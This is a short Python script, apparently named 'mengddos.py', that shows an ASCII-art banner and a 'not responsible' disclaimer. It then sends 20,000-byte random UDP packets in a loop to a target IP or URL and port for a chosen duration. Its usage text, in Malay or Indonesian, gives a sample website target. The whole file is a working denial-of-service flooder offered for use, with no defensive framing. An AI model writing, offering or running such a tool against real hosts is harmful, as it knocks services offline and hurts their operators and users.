import time
import socket
import random
import sys
def usage():
    print ("\033[32;1mSCRIPT DDOS BY KHAI ENCEM\033")
    print ("")
    print ("\033[36;1m@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@\033")
    print ("@@@@@@@@@@@@@@@@/ #@@@@@@@@@@@@@( *@@@@@@@@@@@@@@@")
    print ("@@@@@@@@@@@@,/@@@@@@@@@@@@@@@@@@@@@@@,.@@@@@@@@@@@")
    print ("@@@@@@@@@&.@@@@@@@@@@@&&&&&&&@@@@@@@@@@@ %@@@@@@@@")
    print ("@@@@@@@@.@@@  @@@&@@&@@@@&@@@@&@@&@@@ .@@@ &@@@@@@")
    print ("@@@@@@,@@ @ #@&@@@&@@@&& & @@@@@@@@@@@& & @@ @@@@@")
    print ("@@@@@,@ @  &@&@@&&@@@&@@@ @@@&@@@&&@@&@&  @ @.@@@@")
    print ("@@@@@(@ @. @&@@@@@@@@&@@@&@@@&@@@@@@@@&@ .% @,@@@@")
    print ("@@@@/@ # @/@@@@@@@@@@&@&* .(@@@@@@@@@@@@,@ & &,@@@")
    print ("@@@@*@, # @@@@@@@@     @@ @@     @@@@@&@@ & /@,@@@")
    print ("@@@@@( @ @ @@@@@@/     @@ @(     .@@@@@@ & @ ,@@@@")
    print ("@@@@@,@  @ @@@@@@                 @@&@@& @  @.@@@@")
    print ("@@@@@@@@.@   , ,/                 ,* /   @ @@@@@@@")
    print ("@@@@@@@@@&.@     ,               ,     @ %@@@@@@@@")
    print ("@@@@@@@@@@@@,/%                     &,.@@@@@@@@@@@")
    print ("@@@@@@@@@@@@@@@@* %            %# ,@@@@@@@@@@@@@@@")
    print ("@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@")
    print ("@@@ @@@&%@&@@,@@%@@,@@@@@,*@@@*@%@@@,@@&@@,@ @@*@@")
    print ("@@@@&@@@@@%@@@..@@@,@@@@@@@@@@@/@#@@@..@@@@,@@@# @")
    print ("")
    print ("\033[32;1mI AM NOT RESPONSIBLE FOR ANY RISKS THAT OCCUR WHEN YOU USE THIS SCRIPT!use at your own risk!\033")
    print ("")  
    print ("\033[31;1mCARA MENGGUNAKAN:python mengddos.py <IP/URL> <TARGET PORT> <PACKET>\033")
    print ("\033[31;1mCONTOH:python mengddos.py www.site.com 80 99999\033")
    
def flood(victim, vport, duration):
    
    client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    bytes = random._urandom(20000)
    timeout =  time.time() + duration
    sent = 3000

    while 1:
        if time.time() > timeout:
            break
        else:
            pass
        client.sendto(bytes, (victim, vport))
        sent = sent + 1
        print ("\033[1;91mMenghantar \033[1;32m%s \033[1;91mPaket di \033[1;32m%s \033[1;91mpada port \033[1;32m%s" % (sent, victim, vport))
def main():
    print ("len(sys.argv)")
    if len(sys.argv) != 4:
        usage()
    else:
        flood(sys.argv[1], int(sys.argv[2]), int(sys.argv[3]))

if __name__ == '__main__':
    main()

